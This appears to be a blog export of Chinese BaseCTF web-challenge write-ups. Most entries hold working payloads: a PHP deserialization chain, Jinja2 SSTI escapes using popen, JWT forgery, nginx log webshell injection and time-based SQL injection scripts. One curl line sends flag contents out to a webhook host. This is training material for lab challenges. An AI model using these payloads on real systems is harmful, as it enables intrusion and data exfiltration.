[{"content":"helloworld\n11111111111\n11111111111\n","date":"2024-12-01T12:34:33+08:00","permalink":"http://gucheng.me/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/","title":"[陇剑杯2021]机密内存复现"},{"content":"[Week2] Really EZ POP 这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性但可以使用在类内部写入构造方法来构造链子\nwp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 error_reporting(0); class Sink { private $cmd = \u0026#39;echo 123;\u0026#39;; public function __construct() { $this-\u0026gt;cmd = \u0026#39;system(\\\u0026#39;cat /flag\\\u0026#39;);\u0026#39;; } public function __toString() { eval($this-\u0026gt;cmd); } } class Shark { private $word = \u0026#39;Hello, World!\u0026#39;; public function __construct() { $this-\u0026gt;word = new Sink(); } public function __invoke() { echo \u0026#39;Shark says:\u0026#39; . $this-\u0026gt;word; } } class Sea { public $animal; public function __construct() { $this-\u0026gt;animal = new Shark(); } public function __get($name) { $sea_ani = $this-\u0026gt;animal; echo \u0026#39;In a deep deep sea, there is a \u0026#39; . $sea_ani(); } } class Nature { public $sea; public function __construct() { $this-\u0026gt;sea = new Sea(); } public function __destruct() { echo $this-\u0026gt;sea-\u0026gt;see; } } $ser = new Nature(); echo urlencode(serialize($ser)); [Week2] 所以你说你懂 MD5? 这道题当时是真不会哈希长度扩展攻击，题目源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 \u0026lt;?php session_start(); highlight_file(__FILE__); // 所以你说你懂 MD5 了? $apple = $_POST[\u0026#39;apple\u0026#39;]; $banana = $_POST[\u0026#39;banana\u0026#39;]; if (!($apple !== $banana \u0026amp;\u0026amp; md5($apple) === md5($banana))) { die(\u0026#39;加强难度就不会了?\u0026#39;); } // 什么? 你绕过去了? // 加大剂量! // 我要让他成为 string $apple = (string)$_POST[\u0026#39;appple\u0026#39;]; $banana = (string)$_POST[\u0026#39;bananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) == md5((string)$banana))) { die(\u0026#39;难吗?不难!\u0026#39;); } // 你还是绕过去了? // 哦哦哦, 我少了一个等于号 $apple = (string)$_POST[\u0026#39;apppple\u0026#39;]; $banana = (string)$_POST[\u0026#39;banananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) === md5((string)$banana))) { die(\u0026#39;嘻嘻, 不会了? 没看直播回放?\u0026#39;); } // 你以为这就结束了 if (!isset($_SESSION[\u0026#39;random\u0026#39;])) { $_SESSION[\u0026#39;random\u0026#39;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)); } // 你想看到 random 的值吗? // 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧 $random = $_SESSION[\u0026#39;random\u0026#39;]; echo md5($random); echo \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;; $name = $_POST[\u0026#39;name\u0026#39;] ?? \u0026#39;user\u0026#39;; // check if name ends with \u0026#39;admin\u0026#39; if (substr($name, -5) !== \u0026#39;admin\u0026#39;) { die(\u0026#39;不是管理员也来凑热闹?\u0026#39;); } $md5 = $_POST[\u0026#39;md5\u0026#39;]; if (md5($random . $name) !== $md5) { die(\u0026#39;伪造? NO NO NO!\u0026#39;); } // 认输了, 看样子你真的很懂 MD5 // 那 flag 就给你吧 echo \u0026#34;看样子你真的很懂 MD5\u0026#34;; echo file_get_contents(\u0026#39;/flag\u0026#39;); 第一个比较可以利用传入数组，因为md5函数不能处理数组返回null，两个null自然相等\n第二个比较是弱比较，我们可以利用科学计数法0e开头的字符串传参进行绕过\n第三个比较用了string强制类型转换，我们可以使用工具fastcoll生成两个md5值相同的字符串，原理就是原本payload字符串中含有多种空白符号，MD5加密后hash值相等(空白符号不影响md5值)。但是我们上传参数时会自动进行一次url解码，这样过后因为空白字符两个url就不相等了，从而成功绕过，也可以上网找一些相等的，我这里给出一组\n1 2 3 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 \u0026amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 后面的知识就涉及到哈希长度拓展攻击了\n参考文章: https://luoingly.top/post/md5-length-extension-attack/\nhttps://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html\n全局变量random长度为96\n而name由我们传入可控，后面还会和md5($random)拼接，我们可以构造payload进行填充让新建一个分组包含后面需要验证的admin\n这里使用工具生成了，我是菜比\n先输入random的文本长度，然后是random的hash，最后是我们希望拓展的字符串\n生成后选择url编码一次的payload，浏览器会自动对我们传递的参数进行一次解码。\n然后再传入新的hash，虽然字符串上看起来不一样，但在md5分组运算的时候是一样的，所以两个md5判断为相等，由此拿到flag\n[Week2] 你听不到我的声音 这道题是一个无回显的RCE利用，方法有很多种\n重定向到文件 导入到txt文件我们就可以进行访问了\n1 cat/cp/mv /flag \u0026gt; 1.txt 利用curl命令和[webhook](Webhook.site - Test, transform and automate Web requests and emails)进行信息外带出flag payload\n1 curl https://webhook.site/44f66666-8c8a-47bd-978a-84f7a596c7ff/`cat /flag | base64` 直接写马 写马, 用 wget, curl 下载木马然后webshell管理工具连接\n[Week2] 数学大师 这道题我就只贴脚本了\n我的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import re import requests s = requests.Session() # 使用Session对象 url = \u0026#39;http://challenge.basectf.fun:37945/\u0026#39; res = s.get(url=url) #get请求如果放到循环体相等于打开五十个页面了，我们只需在循环体里更新用于匹配计算式的文本即可 string = res.text for i in range(50): # 提取算术表达式 pattern = r\u0026#39;second ([\\d×÷+-/]+)\u0026#39; matches = re.findall(pattern, string) expression = matches[0].replace(\u0026#39;×\u0026#39;, \u0026#39;*\u0026#39;).replace(\u0026#39;÷\u0026#39;, \u0026#39;/\u0026#39;) # 计算表达式 result = int(eval(expression)) r = s.post(url=url, data={\u0026#39;answer\u0026#39;: result}) print(r.text) # 更新页面内容 string = r.text 官方wp的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests import re req = requests.session() url = \u0026#34;http://challenge.basectf.fun:24989/\u0026#34; answer = 0 while True: response = req.post(url , data={\u0026#34;answer\u0026#34;: answer}) print(response.text) if \u0026#34;BaseCTF\u0026#34; in response.text: print(response.text) break regex = r\u0026#34; (\\d*?)(.)(\\d*)\\?\u0026#34; match = re.search(regex, response.text) if match.group(2) == \u0026#34;+\u0026#34;: answer = int(match.group(1)) + int(match.group(3)) elif match.group(2) == \u0026#34;-\u0026#34;: answer = int(match.group(1)) - int(match.group(3)) elif match.group(2) == \u0026#34;×\u0026#34;: answer = int(match.group(1)) * int(match.group(3)) elif match.group(2) == \u0026#34;÷\u0026#34;: answer = int(match.group(1)) // int(match.group(3)) [Week3] 复读机 这道题是ssti，模版引擎应该是jinja2,这里它必须以BaseCTF开头所以不能直接使用fengjing了。\n还过滤了双花括号，点和双引号和下划线\n寻找可用子类\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]())%} 寻找一个含os模块能RCE的类，我这里懒得写脚本直接用Notepad++将逗号替换为换行符找到该模块的位置为137\n继续构造继承链查看当前作用域中的全局变量\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;])%} 发现Popen方法，可以用它执行命令再用read()读取即可\n构造payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;id\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 执行成功\n但是发现根号被ban了，这里我开始只想到${PATH:0:1},后面一位大佬研究处${HOME%%root}\n一般HOME目录都在/root下\n所以可构造payload查看flag\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cat ${HOME%%root}flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 后面查看该系统环境变量存在一个为根号的环境变量\n构造payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cd $OLDPWD;cat flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} [Week3] 滤个不停 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent = $_POST[\u0026#39;incompetent\u0026#39;]; $Datch = $_POST[\u0026#39;Datch\u0026#39;]; if ($incompetent !== \u0026#39;HelloWorld\u0026#39;) { die(\u0026#39;写出程序员的第一行问候吧！\u0026#39;); } //这是个什么东东？？？ $required_chars = [\u0026#39;s\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;]; $is_valid = true; foreach ($required_chars as $char) { if (strpos($Datch, $char) === false) {//意思是必须在$Datch中找到上面所有字母 $is_valid = false; break; } } if ($is_valid) { $invalid_patterns = [\u0026#39;php://\u0026#39;, \u0026#39;http://\u0026#39;, \u0026#39;https://\u0026#39;, \u0026#39;ftp://\u0026#39;, \u0026#39;file://\u0026#39; , \u0026#39;data://\u0026#39;, \u0026#39;gopher://\u0026#39;]; foreach ($invalid_patterns as $pattern) { if (stripos($Datch, $pattern) !== false) { die(\u0026#39;此路不通换条路试试?\u0026#39;); } } include($Datch); } else { die(\u0026#39;文件名不合规 请重试\u0026#39;); } ?\u0026gt; 我们要实现文件包含，但是一堆伪协议都被过滤掉了，没法绕过！\n后面查找资料发现这里可以用Nginx日志写入webshell\n日志路径为\nnginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log\n利用access.log中User-Agent写入一句话木马，然后post里面传递参数执行命令\n[Week4] No JWT 源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask, request, jsonify import jwt import datetime import os import random import string app = Flask(__name__) # 随机生成 secret_key app.secret_key = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) # 登录接口 @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def login(): data = request.json username = data.get(\u0026#39;username\u0026#39;) password = data.get(\u0026#39;password\u0026#39;) # 其他用户都给予 user 权限 token = jwt.encode({ \u0026#39;sub\u0026#39;: username, \u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, # 普通用户角色 \u0026#39;exp\u0026#39;: datetime.datetime.utcnow() + datetime.timedelta(hours=1) }, app.secret_key, algorithm=\u0026#39;HS256\u0026#39;) return jsonify({\u0026#39;token\u0026#39;: token}), 200 # flag 接口 @app.route(\u0026#39;/flag\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def flag(): token = request.headers.get(\u0026#39;Authorization\u0026#39;) if token: try: decoded = jwt.decode(token.split(\u0026#34; \u0026#34;)[1], options={\u0026#34;verify_signature\u0026#34;: False, \u0026#34;verify_exp\u0026#34;: False}) # 检查用户角色是否为 admin if decoded.get(\u0026#39;role\u0026#39;) == \u0026#39;admin\u0026#39;: with open(\u0026#39;/flag\u0026#39;, \u0026#39;r\u0026#39;) as f: flag_content = f.read() return jsonify({\u0026#39;flag\u0026#39;: flag_content}), 200 else: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Access denied: admin only\u0026#39;}), 403 except FileNotFoundError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Flag file not found\u0026#39;}), 404 except jwt.ExpiredSignatureError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token has expired\u0026#39;}), 401 except jwt.InvalidTokenError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Invalid token\u0026#39;}), 401 return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token is missing\u0026#39;}), 401 if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 发现/login和/flag两个路由，先去login路由查看一下\npost方式访问，修改为json请求并传递json数据发现一串token\n[jwt解密网站](JSON Web Tokens - jwt.io)解析一下token，flag路由检验身份必须为admin，我们修改即可\n因为源码从headers中Authorization接受数据，我们手动添加一个\n又因为如下原因\n在HTTP请求中，Authorization头部用于提供访问受保护资源所需的凭证。Bearer是认证的一种方式，它表示该请求中包含一个访问令牌（access token），这个令牌用于授权用户访问受保护的资源。\n具体来说，Authorization头部的格式为：\n1 Authorization: Bearer \u0026lt;access_token\u0026gt; 其中，Bearer关键字告诉服务器，接下来的 \u0026lt;access_token\u0026gt; 是一个令牌，用于授权请求。Bearer 认证方式是OAuth 2.0标准的一部分，用于实现无状态的访问控制，令牌通常由身份验证服务器颁发，并在请求中传递，用于验证用户身份和权限。\n总的来说，Bearer前缀的作用是明确标识令牌的类型，告诉服务器如何处理和验证这个令牌。\n所以我们构造出如下数据包即可获得flag\n[Week3] ez_php_jail 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include(\u0026#34;hint.html\u0026#34;); $Jail = $_GET[\u0026#39;Jail_by.Happy\u0026#39;]; if($Jail == null) die(\u0026#34;Do You Like My Jail?\u0026#34;); function Like_Jail($var) { if (preg_match(\u0026#39;/(`|\\$|a|c|s|require|include)/i\u0026#39;, $var)) { return false; } return true; } if (Like_Jail($Jail)) { eval($Jail); echo \u0026#34;Yes! you escaped from the jail! LOL!\u0026#34;; } else { echo \u0026#34;You will Jail in your life!\u0026#34;; } echo \u0026#34;\\n\u0026#34;; // 在HTML解析后再输出PHP源代码 ?\u0026gt; 首先解决传参的问题，数据包中发现本题是php7，我们可以利用PHP的字符串解析特性Bypass\n当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _\n例子：?Jail[by.Happy==?Jail_by.Happy\n接着定义了一个函数Like_Jail过滤了`,$,a,c,s,require,include，并且忽略大小写。\n后面就是想办法绕过过滤打印flag，我想了下能够执行系统命令的system,shell_exec,exec都过不了过滤，只能尝试用php函数来进行读取。\n在源码中注释提示// 在HTML解析后再输出PHP源代码。找了找有这几个函数highlight_file()，highlight_string()，show_source()可以直接输出到浏览器。但是后两个过不了过滤，第一个可以\n又因为highlight_file函数需要指定准确的文件路径和flag的a被过滤，所以我们无法直接利用。先利用glob函数获取flag的文件名(没过滤的话就用scandir了！)\nglob函数返回一个包含有匹配文件或目录的数组\nprint_r打印出匹配到以fl开头的文件只有flag一个\n构造payloadhighlight_file(glob('/fl*')[0]);\n[Week3] 玩原神玩的 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include \u0026#39;flag.php\u0026#39;; if (sizeof($_POST[\u0026#39;len\u0026#39;]) == sizeof($array)) { ys_open($_GET[\u0026#39;tip\u0026#39;]); } else { die(\u0026#34;错了！就你还想玩原神？❌❌❌\u0026#34;); } function ys_open($tip) { if ($tip != \u0026#34;我要玩原神\u0026#34;) { die(\u0026#34;我不管，我要玩原神！😭😭😭\u0026#34;); } dumpFlag(); } function dumpFlag() { if (!isset($_POST[\u0026#39;m\u0026#39;]) || sizeof($_POST[\u0026#39;m\u0026#39;]) != 2) { die(\u0026#34;可恶的QQ人！😡😡😡\u0026#34;); } $a = $_POST[\u0026#39;m\u0026#39;][0]; $b = $_POST[\u0026#39;m\u0026#39;][1]; if(empty($a) || empty($b) || $a != \u0026#34;100%\u0026#34; || $b != \u0026#34;love100%\u0026#34; . md5($a)) { die(\u0026#34;某站崩了？肯定是某忽悠干的！😡😡😡\u0026#34;); } include \u0026#39;flag.php\u0026#39;; $flag[] = array(); for ($ii = 0;$ii \u0026lt; sizeof($array);$ii++) { $flag[$ii] = md5(ord($array[$ii]) ^ $ii); } echo json_encode($flag); } 错了！就你还想玩原神？❌❌❌ 解决思路\n满足len的长度检查：我们需要提交一个len数组，使其长度与$array相同。\n正确的tip参数：在GET请求中传递tip=\u0026ldquo;我要玩原神\u0026rdquo;，以通过ys_open的检查。\n构造正确的m参数：m[0]必须为\u0026quot;100%\u0026quot;，而m[1]则为\u0026quot;love100%\u0026ldquo;加上m[0]的MD5哈希。\n先来猜出$array的元素个数吧\n用下面脚本生成字典\n1 2 3 4 5 s = \u0026#34;\u0026#34; with open(\u0026#34;./2.txt\u0026#34;, \u0026#34;w\u0026#34;) as file: for i in range(100): s = s + \u0026#34;len[\u0026#34; + str(i) + \u0026#34;]=1\u0026amp;\u0026#34; file.write(s[:-1] + \u0026#34;\\n\u0026#34;) burp爆破得出$array数组元素个数为45\npayload为len[0]=1\u0026amp;len[1]=1\u0026amp;len[2]=1\u0026amp;len[3]=1\u0026amp;len[4]=1\u0026amp;len[5]=1\u0026amp;len[6]=1\u0026amp;len[7]=1\u0026amp;len[8]=1\u0026amp;len[9]=1\u0026amp;len[10]=1\u0026amp;len[11]=1\u0026amp;len[12]=1\u0026amp;len[13]=1\u0026amp;len[14]=1\u0026amp;len[15]=1\u0026amp;len[16]=1\u0026amp;len[17]=1\u0026amp;len[18]=1\u0026amp;len[19]=1\u0026amp;len[20]=1\u0026amp;len[21]=1\u0026amp;len[22]=1\u0026amp;len[23]=1\u0026amp;len[24]=1\u0026amp;len[25]=1\u0026amp;len[26]=1\u0026amp;len[27]=1\u0026amp;len[28]=1\u0026amp;len[29]=1\u0026amp;len[30]=1\u0026amp;len[31]=1\u0026amp;len[32]=1\u0026amp;len[33]=1\u0026amp;len[34]=1\u0026amp;len[35]=1\u0026amp;len[36]=1\u0026amp;len[37]=1\u0026amp;len[38]=1\u0026amp;len[39]=1\u0026amp;len[40]=1\u0026amp;len[41]=1\u0026amp;len[42]=1\u0026amp;len[43]=1\u0026amp;len[44]=1\n绕过接下来两个\n最后这一步中因为PHP中ord函数只取一个字符串的首字母的ascii值，这个值肯定在0-255之间。我们可以通过爆破的方式来通过md5值的比较找出正确的字符\n脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $md5 = [\u0026#34;3295c76acbf4caaed33c36b1b5fc2cb1\u0026#34;,\u0026#34;26657d5ff9020d2abefe558796b99584\u0026#34;,\u0026#34;73278a4a86960eeb576a8fd4c9ec6997\u0026#34;,\u0026#34;ec8956637a99787bd197eacd77acce5e\u0026#34;,\u0026#34;e2c420d928d4bf8ce0ff2ec19b371514\u0026#34;,\u0026#34;43ec517d68b6edd3015b3edc9a11367b\u0026#34;,\u0026#34;ea5d2f1c4608232e07d3aa3d998e5135\u0026#34;,\u0026#34;c8ffe9a587b126f152ed3d89a146b445\u0026#34;,\u0026#34;66f041e16a60928b05a7e228a89c3799\u0026#34;,\u0026#34;642e92efb79421734881b53e1e1b18b6\u0026#34;,\u0026#34;a3c65c2974270fd093ee8a9bf8ae7d0b\u0026#34;,\u0026#34;9f61408e3afb633e50cdf1b20de6f466\u0026#34;,\u0026#34;72b32a1f754ba1c09b3695e0cb6cde7f\u0026#34;,\u0026#34;093f65e080a295f8076b1c5722a46aa2\u0026#34;,\u0026#34;a97da629b098b75c294dffdc3e463904\u0026#34;,\u0026#34;093f65e080a295f8076b1c5722a46aa2\u0026#34;,\u0026#34;7f39f8317fbdb1988ef4c628eba02591\u0026#34;,\u0026#34;e369853df766fa44e1ed0ff613f563bd\u0026#34;,\u0026#34;c45147dee729311ef5b5c3003946c48f\u0026#34;,\u0026#34;eb160de1de89d9058fcb0b968dbbbd68\u0026#34;,\u0026#34;a5771bce93e200c36f7cd9dfd0e5deaa\u0026#34;,\u0026#34;9f61408e3afb633e50cdf1b20de6f466\u0026#34;,\u0026#34;e369853df766fa44e1ed0ff613f563bd\u0026#34;,\u0026#34;eb160de1de89d9058fcb0b968dbbbd68\u0026#34;,\u0026#34;d645920e395fedad7bbbed0eca3fe2e0\u0026#34;,\u0026#34;a0a080f42e6f13b3a2df133f073095dd\u0026#34;,\u0026#34;b53b3a3d6ab90ce0268229151c9bde11\u0026#34;,\u0026#34;a0a080f42e6f13b3a2df133f073095dd\u0026#34;,\u0026#34;da4fb5c6e93e74d3df8527599fa62642\u0026#34;,\u0026#34;d9d4f495e875a2e075a1a4a6e1b9770f\u0026#34;,\u0026#34;d9d4f495e875a2e075a1a4a6e1b9770f\u0026#34;,\u0026#34;c0c7c76d30bd3dcaefc96f40275bdc0a\u0026#34;,\u0026#34;c74d97b01eae257e44aa9d5bade97baf\u0026#34;,\u0026#34;735b90b4568125ed6c3f678819b6e058\u0026#34;,\u0026#34;7cbbc409ec990f19c78c75bd1e06f215\u0026#34;,\u0026#34;6f4922f45568161a8cdf4ad2299f6d23\u0026#34;,\u0026#34;6ea9ab1baa0efb9e19094440c317e21b\u0026#34;,\u0026#34;e2c420d928d4bf8ce0ff2ec19b371514\u0026#34;,\u0026#34;a3f390d88e4c41f2747bfa2f1b5f87db\u0026#34;,\u0026#34;c16a5320fa475530d9583c34fd356ef5\u0026#34;,\u0026#34;c16a5320fa475530d9583c34fd356ef5\u0026#34;,\u0026#34;28dd2c7955ce926456240b2ff0100bde\u0026#34;,\u0026#34;d2ddea18f00665ce8623e36bd4e3c7c5\u0026#34;,\u0026#34;6ea9ab1baa0efb9e19094440c317e21b\u0026#34;,\u0026#34;43ec517d68b6edd3015b3edc9a11367b\u0026#34;]; $flag = \u0026#34;\u0026#34;; for ($i=0;$i\u0026lt;count($md5);$i++){ for ($j=0;$j\u0026lt;256;$j++){ $xor_result = $j ^ $i; $cal_md5 = md5($xor_result); if ($cal_md5 === $md5[$i]){ $flag .= chr($j); break; } } } echo \u0026#34;得到flag为:\u0026#34;.$flag; [Week4] only one sql 源码\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $sql = $_GET[\u0026#39;sql\u0026#39;]; if (preg_match(\u0026#39;/select|;|@|\\n/i\u0026#39;, $sql)) { die(\u0026#34;你知道的，不可能有sql注入\u0026#34;); } if (preg_match(\u0026#39;/\u0026#34;|\\$|`|\\\\\\\\/i\u0026#39;, $sql)) { die(\u0026#34;你知道的，不可能有RCE\u0026#34;); } //flag in ctf.flag $query = \u0026#34;mysql -u root -p123456 -e \\\u0026#34;use ctf;select \u0026#39;没有select，让你执行一句又如何\u0026#39;;\u0026#34; . $sql . \u0026#34;\\\u0026#34;\u0026#34;; system($query); 此题不能用select，可以通过show databases和show tables查库名和表名，后面发现题目注释里面其实写了//flag in ctf.flag,在ctf库的flag表中\n直接利用show columns查看到flag表的字段，估计就在data里面。这里不能用select，我们可以尝试delete进行盲注\n贴一下官方的wp,是真的简洁高效啊，这就是我和大佬的差距吗\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import string sqlstr = string.ascii_lowercase + string.digits + \u0026#39;-\u0026#39; + \u0026#34;{}\u0026#34; url = \u0026#34;http://your.website/?sql=delete%20from%20flag%20where%20data%20like%20%27\u0026#34; end=\u0026#34;%25%27%20and%20sleep(5)\u0026#34; flag=\u0026#39;\u0026#39; for i in range(1, 100): for c in sqlstr: payload = url +flag+ c + end try: r = requests.get(payload,timeout=4) except: print(flag+c) flag+=c break 经过查表和对flag格式的了解，flag的内容就在小写字母，数字和这几个符号之间，生成一个列表进行枚举\n我的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests import time list = [\u0026#39;-\u0026#39;] for i in range(97,127): #小写字母和符号 list.append(chr(i)) for i in range(48,58): #数字 list.append(chr(i)) # print(list) #delete from flag where data like \u0026#39;f%\u0026#39; and sleep(3)-- url = \u0026#34;http://challenge.basectf.fun:27082/?sql=delete from flag where data like \u0026#39;\u0026#34; end = \u0026#34;%\u0026#39; and sleep(3)--\u0026#34; flag = \u0026#34;\u0026#34; for x in range(100): for j in list: start_time = time.time() payload = url + flag + j + end res = requests.get(payload) use_time = time.time() - start_time if use_time \u0026gt;= 3: flag += j print(flag) [Fin] 1z_php 这道题考察原生类(读取文件类SplFileObject)和PCRE回溯\n脚本\n1 2 3 4 import requests payload = \u0026#34;http://challenge.basectf.fun:28522/?e[m.p=114514.1\u0026amp;a=SplFileObject\u0026amp;b=php://filter/read=convert.base64-encode/resource=flag.php\u0026amp;c=__toString\u0026#34; res = requests.post(payload,data={\u0026#34;try\u0026#34;:\u0026#34;a\u0026#34;*1000001 + \u0026#34;HACKER\u0026#34;}) print(res.text) [Fin] Back to the future 此题纯粹靠一款工具，我仔细看了一下，比我之前用的githack强太多了！\n提取仓库文件 githacker --url http://challenge.basectf.fun:42682/.git/ --output-folder C:\\Users\\xxx\\Desktop\\result\n查看提交日志 git log\n切换到含flag的提交 git checkout 9d85f10e0192ef630e10d7f876a117db41c30417\n恢复出来\n[Fin] Jinja Mark flag路径下看到提示爆破出幸运数字为5346\n可用以下脚本生成字典\n1 2 3 4 with open(r\u0026#39;c:\\Users\\天\\Desktop\\3.txt\u0026#39;,\u0026#39;w\u0026#39;) as f: for i in range(10000): f.write(f\u0026#34;{i:04}\u0026#34;+\u0026#34;\\n\u0026#34;) print(\u0026#34;successful~\u0026#34;) 拿到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 BLACKLIST_IN_index = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;] def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) 